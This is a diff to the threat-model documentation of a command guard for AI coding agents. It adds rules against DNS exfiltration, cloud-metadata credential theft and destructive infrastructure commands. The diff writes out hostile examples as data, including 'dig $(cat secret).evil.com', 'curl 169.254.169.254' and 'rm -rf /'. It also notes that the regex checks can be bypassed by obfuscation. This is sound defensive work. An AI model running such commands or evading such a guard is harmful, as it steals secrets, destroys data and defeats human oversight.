@@ -22,9 +22,12 @@ legitimate build, test, and commit work.
 | T1 | Rewrite protected-branch history (force-push, hard-reset, rebase of `main`/`master`/`release`) via the structured git tool | symbolic git policy | machine-checked by z3: no admitted action rewrites protected history |
 | T2 | Same via raw shell (`git push --force`, `git reset --hard`) | branch-parsed regex | heuristic; a rewrite naming no branch escalates to a human |
 | T3 | Destroy the repo / home / root (`rm -rf .`, `rm -rf ~`, `rm -rf /`) | regex, scoped to repo/home/root targets | heuristic, high-precision |
-| T4 | Exfiltrate a secret over the network (secret shape + curl/wget/nc to a host) | regex | heuristic |
-| T5 | Write a secret to disk (secret shape + redirect/tee, or a file write) | regex | heuristic |
+| T4 | Exfiltrate a secret over the network (secret shape + curl/wget/nc **or DNS (dig/nslookup)** to a host) | regex | heuristic |
+| T5 | Write a secret to disk (secret shape + redirect/tee, or a file write). Secret shapes include modern provider keys (`sk-proj-`, `sk-ant-`), AWS, GitHub, private keys | regex | heuristic |
 | T6 | Disable CI (empty a `.github/workflows` file) | path + content | heuristic |
+| T7 | Steal cloud credentials via the instance-metadata endpoint (`curl 169.254.169.254/...`, `metadata.google.internal`) — no secret in the command, so T4 alone missed it | regex, fetch-context scoped | heuristic, high-precision |
+| T8 | Exfiltrate via DNS tunneling (a lookup whose name is built from a command substitution, `dig $(cat secret).evil.com`) | regex | heuristic |
+| T9 | (opt-in `devops` preset) Catastrophic infra/data destruction with real cloud/db credentials: `terraform destroy`, `kubectl delete namespace/pvc`, cloud instance/cluster/bucket/db deletion, `redis-cli FLUSHALL`, `DROP DATABASE`, `dropdb`, `npm unpublish`, `wipefs` | opt-in regex denylist | heuristic, high-precision, off by default |
 
 ## Out of scope (by design, not policed)
 
@@ -49,9 +52,12 @@ legitimate build, test, and commit work.
 
 ## Residual risk
 
-Even under the assumptions, T2-T6 are heuristic and bypassable by obfuscation. The
+Even under the assumptions, T2-T9 are heuristic and bypassable by obfuscation. The
 only property proven end-to-end is that the *structured* git policy (T1) has no gap
 that admits a protected-history rewrite. Everything else is precision-tuned
-pattern matching, validated for low false-friction on 3,790 real commands but not
-proven complete against evasion. Deploy accordingly: defense in depth, in front of
-a sandbox, not as the only control.
+pattern matching. It is validated for low false-friction on real commands: the
+reference corpus is 3,790 commands, and the expanded T1-T9 ruleset was re-confirmed
+at **0 false blocks on the latest 2,848-command run** across 12 trusted popular
+repos (rust, tokio, deno, ripgrep, ruff, flask, ...). It is not proven complete
+against evasion. Deploy accordingly: defense in depth, in front of a sandbox, not
+as the only control.
